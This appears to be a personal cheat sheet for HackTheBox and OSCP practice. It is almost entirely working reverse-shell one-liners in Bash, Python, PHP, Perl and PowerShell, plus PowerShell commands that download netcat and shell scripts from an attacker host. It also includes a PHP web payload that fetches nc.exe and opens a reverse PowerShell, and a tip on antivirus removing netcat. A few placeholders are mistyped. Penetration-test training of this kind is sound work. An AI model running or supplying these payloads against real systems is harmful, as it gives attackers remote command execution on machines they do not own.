# HackTheBox
For OSCP preparation!

## CheatSheet
* [Reverse shell](#Reverse)

### Bash

```bash
bash -i >& /dev/tcp/{IP}}/{PORT}} 0>&1
sh -i >& /dev/udp/{IP}/{PORT}} 0>&1

0<&196;exec 196<>/dev/tcp/<your IP>/<same unfiltered port>; sh <&196 >&196 2>&196
```

### Python

```Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

### php
```PHP
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'");
```

### Perl

```perl
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IP]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

### Powershell

```Powershell
Create shell.ps1

$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

## Useful-GOTO LIST


**One Liner Download file with powershell**
```Download File -Powershell
cmd.exe> powershell IWR http://10.12.12.12/nc.exe -outfile \\PATH\\nc.exe

PS> Invoke-WebRequest http://10.10.15.15/shell.ps1 -OutFile c:\shell.ps1
```
**One liner PHP Reverse shell when Target machine is Windows**
```

<?= system("powershell IWR http://10.12.12.12/nc.exe -outfile \\windows\\temp\\nc.exe; \\windows\\temp\\nc.exe 10.12.12.12 4444 -e powershell.exe 2>&1") ?>

Start Listerner > nc -lvnp 4444
If reverse shell does not connect -Verify if target machine has AV as it may delete the netcat.
```
